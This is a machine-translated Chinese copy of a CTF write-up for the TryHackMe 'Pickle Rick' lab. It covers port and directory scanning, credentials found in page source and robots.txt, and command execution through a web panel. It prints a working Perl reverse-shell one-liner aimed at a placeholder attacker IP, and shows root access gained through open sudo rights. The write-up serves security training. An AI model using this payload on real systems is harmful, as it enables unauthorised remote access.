<html>
<head>
<title>PickleRick — TryHackMe Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">pickle Rick-TryHackMe报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/picklerick-tryhackme-writeup-74c6fedae081?source=collection_archive---------1-----------------------#2020-04-10">https://infosecwriteups.com/picklerick-tryhackme-writeup-74c6fedae081?source=collection_archive---------1-----------------------#2020-04-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2370" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Pickle Rick是一个以Rick和Morty为主题的tryhackme房间，在这里我们利用网络服务器找到3种配料或旗帜。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/25335e583facdbce4d1272c92bc97d37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K3gLWti8K7UyprucM8uKvQ.png"/></div></div></figure><p id="169e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">先说枚举。</p><h1 id="d33e" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">端口扫描</h1><pre class="km kn ko kp gt lv lw lx ly aw lz bi"><span id="6455" class="ma ky iq lw b gy mb mc l md me">Starting Nmap 7.80 ( https://nmap.org ) at 2020–04–10 15:35 IST<br/>Nmap scan report for 10.10.222.8<br/>Host is up (0.22s latency).<br/>Not shown: 998 closed ports<br/>PORT STATE SERVICE VERSION<br/>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)<br/>80/tcp open http Apache httpd 2.4.18 ((Ubuntu))<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="81e7" class="ma ky iq lw b gy mf mc l md me">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds</span></pre><p id="bd50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Nmap给出了这个结果，并且只有2个端口是打开的。</p><p id="f7eb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们前进到运行在端口80上的网站。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mg"><img src="../Images/3b2c2ef605054d09ce34dd2aa7936d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LK25TllRhSNTU1_fIQohaw.png"/></div></div></figure><p id="adbc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该网页出现在端口80上。这里没有有用的数据。</p><p id="4671" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是如果我们检查页面源代码呢？</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mg"><img src="../Images/cbda21b139a8f75a31bc37bca8c881fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZwwKyE501Ye8QtvwMunLnA.png"/></div></div></figure><p id="c284" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在HTML注释中得到一个用户名！！</p><pre class="km kn ko kp gt lv lw lx ly aw lz bi"><span id="181b" class="ma ky iq lw b gy mb mc l md me">Note to self, remember username!<br/><br/>Username: R1ckRul3s</span></pre><p id="cab4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是我们必须在哪里使用它呢？</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mh mi l"/></div></figure><h2 id="8ec0" class="ma ky iq bd kz mj mk dn ld ml mm dp lh jy mn mo ll kc mp mq lp kg mr ms lt mt bi translated">更多枚举！！！！！</h2><p id="7b0a" class="pw-post-body-paragraph jn jo iq jp b jq mu js jt ju mv jw jx jy mw ka kb kc mx ke kf kg my ki kj kk ij bi translated">我用dirsearch找到感兴趣的目录和文件。</p><pre class="km kn ko kp gt lv lw lx ly aw lz bi"><span id="2db5" class="ma ky iq lw b gy mb mc l md me">[15:49:33] 301 -  311B  - /assets  -&gt;  <a class="ae mz" href="http://10.10.222.8/assets/" rel="noopener ugc nofollow" target="_blank">http://10.10.222.8/assets/</a><br/>[15:49:40] 200 -    1KB - /index.html<br/>[15:49:42] 200 -  882B  - /login.php<br/>[15:49:47] 200 -   17B  - /robots.txt</span></pre><p id="0186" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Dirsearch结果给了我几个目录，可能是有趣的。</p><p id="4fbd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">/assets有GIF、CSS、JS文件，这些文件正在网站上使用，没有什么有趣的东西。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi na"><img src="../Images/b98a35b266ffa9814865b9d2673d33bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1082/format:webp/1*f5JsuDuj70nOhc7WkJAnSw.png"/></div></figure><p id="45fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我浏览了robots.txt文件，看看有没有什么有趣的东西。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/dd0230fd8b9a15fb779659581f556d06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*WEO694ZAFOG5Ci9Hxm5mBw.png"/></div></figure><p id="c555" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它有这个奇怪的字符串<em class="nc">wubbalubadub</em></p><p id="4fdd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来看到的是dirsearch找到的最有趣的页面，登录页面！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mg"><img src="../Images/304d4b80d5db933bad84cdf729c78cdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z0z7WcFLcq0rl-ErGlmm6g.png"/></div></div></figure><p id="7766" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">/login.php提供了这个基本的登录页面！我们有一个在页面源代码中找到的用户名！<em class="nc">R1 ckrul3s</em>’。</p><p id="5a68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">密码可能是什么！！！也许是我们在robots.txt里找到的诡异字符串？</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="nd mi l"/></div></figure><p id="ba5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试了用户名'<em class="nc"> R1ckRul3s </em>，密码'<em class="nc">wubbalubadubdub</em>。</p><p id="50c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">登录成功！！！</strong></p><p id="02b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们被重定向到/portal.php，其中给出了一个命令面板。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mg"><img src="../Images/9bf80b72f385cefd341c0aa029cc1765.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-JzV-F3A1Q76suSKXuK30g.png"/></div></div></figure><p id="14b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在尝试'<em class="nc"> ls' </em>列出目录中的所有文件，包括'<em class="nc">sup 3rs 3 cretpickl3ingred . txt '</em></p><p id="55e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是等等！！我们无法读取文件！如果我们输入“cat Sup3rS3cretPickl3Ingred.txt ”,则会出现一个错误</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ne"><img src="../Images/ceaafb903e3ffc2ba984e086cb69c312.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bvLeJUwUS0_4OMr8KMyBxA.png"/></div></div></figure><p id="e37f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">前往<a class="ae mz" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> Pentest Monkey的反向壳Cheatsheet </a>。</p><p id="5da7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试过bash reverse shell payload，但是没用，接下来是perl payload。</p><pre class="km kn ko kp gt lv lw lx ly aw lz bi"><span id="3c26" class="ma ky iq lw b gy mb mc l md me">perl -e 'use Socket;$i="ATTACKER-IP";$p=LISTENING-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span></pre><p id="479e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个有效载荷起作用了！！！我们使用perl反向shell有效负载获得了shell。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/e27286027c2ff91e7fa2b3e5b0fabf6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1016/format:webp/1*sX2voviG-GOcvGZjzqz5wg.png"/></div></figure><p id="6616" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有了第一面旗帜，机器里还有2面旗帜。让我们读一下clue.txt，看看有没有什么能让我们找到2号标志。</p><p id="301a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">线索内容:txt :-</p><pre class="km kn ko kp gt lv lw lx ly aw lz bi"><span id="f475" class="ma ky iq lw b gy mb mc l md me">Look around the file system for the other ingredient.</span></pre><p id="e666" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试在几个目录中查找标志，最终在用户“rick”的主目录中找到了第二个标志</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/8a04b220138daf7e3b67b6fc85c5595d.png" data-original-src="https://miro.medium.com/v2/resize:fit:472/format:webp/1*IaGRYPIGeNsutSIYV01sYQ.png"/></div></figure><p id="415c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨哟！第三面旗子还在机器里的某个地方！！</p><p id="edf8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试着<em class="nc"> sudo -l </em>看看我们是否有任何sudo权限！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nh"><img src="../Images/f05967ce6abcb53c3bc4a5034f0e681e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UF_uFCjgTC09aDeGEAUyUA.png"/></div></div></figure><h2 id="d3c4" class="ma ky iq bd kz mj mk dn ld ml mm dp lh jy mn mo ll kc mp mq lp kg mr ms lt mt bi translated">我们可以使用任何命令作为根没有密码！！！</h2><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="nd mi l"/></div></figure><p id="132c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了/根目录中的第三个标志！</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/c7a9450e5feb34f6dbac2fe41ad3e56c.png" data-original-src="https://miro.medium.com/v2/resize:fit:468/format:webp/1*uMkVsqvzhFow1hotAeSyPw.png"/></div></figure><p id="854e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用不同的反向shell有效载荷可能实际上是有益的，也许我们可以访问！！</p><p id="7151" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您阅读这篇文章！希望你喜欢；-)</p><p id="89b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">联系我:</p><div class="nj nk gp gr nl nm"><a href="https://twitter.com/RitikSahni22" rel="noopener  ugc nofollow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">里提克·萨尼(http.deep)</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">里提克·萨尼的最新推文(http.deep) (@RitikSahni22)。网络安全爱好者！👨‍💻臭虫猎人🔎💡CTF…</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">twitter.com</p></div></div><div class="nv l"><div class="nw l nx ny nz nv oa kv nm"/></div></div></a></div><p id="8607" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">电子邮件:ritiksahni0203@gmail.com</p><p id="3aef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">干杯！</p><p id="f2f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">里提克·萨尼</p></div><div class="ab cl ob oc hu od" role="separator"><span class="oe bw bk of og oh"/><span class="oe bw bk of og oh"/><span class="oe bw bk of og"/></div><div class="ij ik il im in"><p id="0585" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nc">关注</em> <a class="ae mz" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nc"> Infosec报道</em> </a> <em class="nc">获取更多此类精彩报道。</em></p><div class="nj nk gp gr nl nm"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nn ab fo"><div class="no ab np cl cj nq"><h2 class="bd ir gy z fp nr fr fs ns fu fw ip bi translated">信息安全报道</h2><div class="nt l"><h3 class="bd b gy z fp nr fr fs ns fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nu l"><p class="bd b dl z fp nr fr fs ns fu fw dk translated">medium.com</p></div></div><div class="nv l"><div class="oi l nx ny nz nv oa kv nm"/></div></div></a></div></div></div>    
</body>
</html>